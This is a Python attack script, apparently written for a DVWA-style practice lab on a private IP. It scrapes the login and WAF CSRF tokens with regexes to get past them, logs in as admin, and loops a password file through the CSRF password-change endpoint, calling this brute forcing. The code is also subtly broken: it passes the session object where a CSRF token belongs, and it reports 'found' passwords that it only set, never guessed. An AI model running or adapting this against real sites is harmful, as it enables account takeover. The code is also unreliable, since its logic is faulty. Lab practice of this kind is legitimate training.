import requests
import re

INITIAL_USERNAME = "admin"
INITIAL_PASSWORD = input("請輸入初始密碼: ")

BASE_URL = "http://192.168.200.180"
LOGIN_URL = f"{BASE_URL}/login.php"
CSRF_URL = f"{BASE_URL}/vulnerabilities/csrf/"

def extract_token(response_text):
    user_token_match = re.search(r"name='user_token' value='([a-f0-9]{32})'", response_text)
    user_token = user_token_match.group(1) if user_token_match else None

    waf_csrf_token_match = re.search(r"var RYXHQ2 = '([A-Fa-f0-9]{64})'", response_text)
    waf_csrf_token = waf_csrf_token_match.group(1) if waf_csrf_token_match else None

    if user_token and waf_csrf_token:
        print(f"[DEBUG] 找到 user_token: {user_token}")
        print(f"[DEBUG] 找到 waf_csrf_token: {waf_csrf_token}")
        return user_token, waf_csrf_token
    else:
        print("[-] 無法找到 token")
        return None, None

def login(session, username, password):
    print("[*] 嘗試訪問登入頁...")
    response = session.get(LOGIN_URL)

    if response.status_code != 200:
        print(f"[-] 登入頁面加載失敗，狀態碼：{response.status_code}")
        return None

    user_token, waf_csrf_token = extract_token(response.text)

    if not user_token or not waf_csrf_token:
        print("[-] 無法取得初始 token")
        return None

    data = {
        "username": username,
        "password": password,
        "Login": "Login",
        "user_token": user_token,
        "waf_csrf_token": waf_csrf_token
    }
    
    response = session.post(LOGIN_URL, data=data)

    if "Welcome" in response.text:
        print("[+] 登入成功！")
        return session  
    else:
        print("[-] 登入失敗")
        return None

def change_password(session, new_password, waf_csrf_token):
    params = {
        "password_new": new_password,
        "password_conf": new_password,
        "Change": "Change",
        "waf_csrf_token": waf_csrf_token
    }

    response = session.get(CSRF_URL, params=params)

    if "Password Changed" in response.text:
        print(f"[+] 密碼成功更改為：{new_password}")
        return True
    else:
        print("[-] 密碼更改失敗")
        return False

def brute_force_password(session):
    with open("passwd.txt", "r") as file:
        passwords = file.readlines()

    found_passwords = [] 

    for password in passwords:
        password = password.strip()
        print(f"[*] 嘗試密碼：{password}")

        waf_csrf_token = login(session, INITIAL_USERNAME, INITIAL_PASSWORD)

        if not waf_csrf_token:
            print("[-] 無法取得最新的 CSRF token，跳過該次嘗試")
            continue
        
        if change_password(session, password, waf_csrf_token):
            found_passwords.append(password)  
            print(f"[+] 找到有效密碼：{password}")
    
    if found_passwords:
        print("[*] 所有找到的有效密碼：")
        for pw in found_passwords:
            print(f" - {pw}")
    else:
        print("[-] 沒有找到有效密碼")

def main():
    session = requests.Session()
    print("[*] 嘗試初始登入...")
    if login(session, INITIAL_USERNAME, INITIAL_PASSWORD):
        print("[*] 初始登入成功，開始爆破...")
        brute_force_password(session)
    else:
        print("[-] 初始登入失敗，結束程序")

if __name__ == "__main__":
    main()
